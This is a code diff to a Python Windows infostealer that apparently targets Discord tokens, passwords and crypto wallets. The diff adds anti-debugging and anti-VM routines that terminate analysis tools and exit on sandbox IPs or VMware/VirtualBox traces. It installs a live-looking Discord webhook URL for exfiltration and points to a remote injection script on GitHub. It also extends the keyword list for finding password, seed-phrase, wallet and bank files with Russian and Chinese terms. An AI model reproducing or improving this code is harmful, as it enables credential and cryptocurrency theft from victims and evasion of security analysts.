@@ -18,37 +18,11 @@ from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_
 from Crypto.Cipher import AES
 from json import loads as json_loads, load
 from json import *
-import socket
-import uuid
-import getpass
+import ctypes
+import winreg
+import urllib
 
 
-
-
-
-blacklistUsers = ['test1', 'test2']
-
-username = getpass.getuser()
-
-if username.lower() in blacklistUsers:
-    os._exit(0)
-
-def kontrol():
-
-    blacklistUsername = ['test1', 'test2']
-
-    hostname = socket.gethostname()
-
-    if any(name in hostname for name in blacklistUsername):
-        os._exit(0)
-
-kontrol()
-
-BLACKLIST1 = ['00:00:00:00:00:00', '00:00:00:00:00:00']
-
-mac_address = uuid.getnode()
-if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
-    os._exit(0)
 
 
 class NullWriter(object):
@@ -69,9 +43,66 @@ for module in ModuleRequirements:
         subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
         time.sleep(3)
 
+def antidebug():
+    checks = [check_windows, check_ip, check_registry, check_dll]
+    for check in checks:
+        t = threading.Thread(target=check, daemon=True)
+        t.start()
 
+def exit_program(reason):
+    print(reason)
+    ctypes.windll.kernel32.ExitProcess(0)
 
-h00k = "https://ptb.discord.com/api/webhooks/test"
+def check_windows():
+    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
+    def winEnumHandler(hwnd, ctx):
+        title = ctypes.create_string_buffer(1024)
+        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
+        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george',}:
+            pid = ctypes.c_ulong(0)
+            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+            if pid.value != 0:
+                try:
+                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
+                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
+                    ctypes.windll.kernel32.CloseHandle(handle)
+                except:
+                    pass
+            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
+        return True
+
+    while True:
+        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
+        time.sleep(0.5)
+def check_ip():
+    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
+    while True:
+        try:
+            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
+            if ip in blacklisted:
+                exit_program('Blacklisted IP Detected')
+            return
+        except:
+            pass
+
+def check_registry():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
+        subkey_count = winreg.QueryInfoKey(key)[0]
+        for i in range(subkey_count):
+            subkey = winreg.EnumKey(key, i)
+            if subkey.startswith('VMWARE'):
+                exit_program('VM Detected')
+        winreg.CloseKey(key)
+    except:
+        pass
+
+def check_dll():
+    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
+    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
+        exit_program('VM Detected')
+
+h00k = "https://ptb.discord.com/api/webhooks/1227695657461092362/GgjWwrCRkgIPAKymcCfvOA9cNuqh83ORQR35sPtdJM1bsczvwrBk3Fvx1M01F1PnhBUW"
 inj3c710n_url = f"https://raw.githubusercontent.com/0x00G/injection/main/index.js"
 
 class DATA_BLOB(Structure):
@@ -1053,57 +1084,20 @@ def K1W1():
     ]
 
     key_wordsFiles = [
-        "passw",
-        "mdp",
-        "motdepasse",
-        "mot_de_passe",
-        "login",
-        "secret",
-        "bot",
-        "atomic",
-        "account",
-        "acount",
-        "paypal",
-        "banque",
-        "bot",
-        "metamask",
-        "wallet",
-        "crypto",
-        "exodus",
-        "discord",
-        "2fa",
-        "code",
-        "memo",
-        "compte",
-        "token",
-        "backup",
-        "secret",
-        "seed",
-        "mnemonic"
-        "memoric",
-        "private",
-        "key",
-        "passphrase",
-        "pass",
-        "phrase",
-        "steal",
-        "bank",
-        "info",
-        "casino",
-        "prv",
-        "privé",
-        "prive",
-        "telegram",
-        "identifiant",
-        "personnel",
-        "trading"
-        "bitcoin",
-        "sauvegarde",
-        "funds",
-        "récupé",
-        "recup",
-        "note",
-    ]
+    "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret",
+    "bot", "atomic", "account", "acount", "paypal", "banque", "metamask", "wallet",
+    "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token",
+    "backup", "seed", "mnemonic", "memoric", "private", "key", "passphrase",
+    "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé",
+    "prive", "telegram", "identifiant", "personnel", "trading", "bitcoin",
+    "sauvegarde", "funds", "récupé", "recup", "note", 
+    "пароль", "секрет", "аккаунт", "банк", "логин", "кошелек", "мнемоника", 
+    "密碼", "帳戶", "秘密", "登錄", "錢包", "私鑰", "助記詞", 
+    "биткоин", "фраза", "ключ", "заметка", "информация", 
+    "以太坊", "交易", "硬件钱包", "软件钱包", "资产", "提现", "存款", 
+    "криптовалюта", "обмен", "вложение", "инвестиция", "стейкинг", "дефи", 
+    "加密货币", "交换", "投资", "赌场", "个人", "交易", "费用" 
+]
    
     wikith = []
     for patt in path2search: 
